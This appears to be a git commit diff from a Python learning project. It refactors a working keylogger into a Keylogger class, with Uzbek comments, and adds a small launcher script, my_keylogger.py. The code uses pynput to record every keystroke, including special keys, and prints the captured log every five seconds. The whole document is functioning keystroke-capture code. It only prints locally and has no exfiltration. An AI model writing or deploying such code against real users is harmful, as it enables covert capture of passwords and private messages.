3c9f820a3688b659758161d5ec76793088f35e1a
mustafoyevahmadjon <mustafayevaxmadjon@gmail.com>
2024-10-20 22:20:48 +0500

    oop

--- main.py
+++ main.py
@@ -4,25 +4,30 @@ import threading
 
 log = ""
 
-def process_key_press(key):
-    global log
-    try:
-        log += str(key.char)  # Agar tugma harf bo'lsa
-    except AttributeError:
-        if key == key.space:
-            log += " "  # Bo'sh joy tugmasi uchun
-        else:
-            log += f" [{key}] "  # Maxsus tugmalar uchun
-            
-def report():
-	global log
-	print(log)  # Logni chop etish
-	log= "" # Logni tozalash
-	timer = threading.Timer(5, report)  # 5 soniyadan keyin qayta chaqirish
-	timer.start() # Timerni boshlash
- 
-keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
+class Keylogger:
+    def process_key_press(self, key):
+        global log
+        try:
+            log += str(key.char)  # Agar tugma harf bo'lsa
+        except AttributeError:
+            if key == key.space:
+                log += " "  # Bo'sh joy tugmasi uchun
+            else:
+                log += f" [{key}] "  # Maxsus tugmalar uchun
 
-with keyboard_listener:
-	report() # Reportni boshlash
-	keyboard_listener.join()  # Listenerni ishga tushirish
+    def report(self):
+        global log
+        print(log)  # Logni chop etish
+        log = ""  # Logni tozalash
+        timer = threading.Timer(5, self.report)  # 5 soniyadan keyin qayta chaqirish
+        timer.start()  # Timerni boshlash
+
+    def start(self):
+        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
+        with keyboard_listener:
+            self.report()  # Reportni boshlash
+            keyboard_listener.join()  # Listenerni ishga tushirish
+
+# Keylogger obyektini yaratish va boshlash
+keylogger = Keylogger()
+keylogger.start()
---
+++ my_keylogger.py
@@ -0,0 +1,5 @@
+#!/usr/bin/env python
+import main
+
+my_keylogger = main.Keylogger()
+my_keylogger.start()
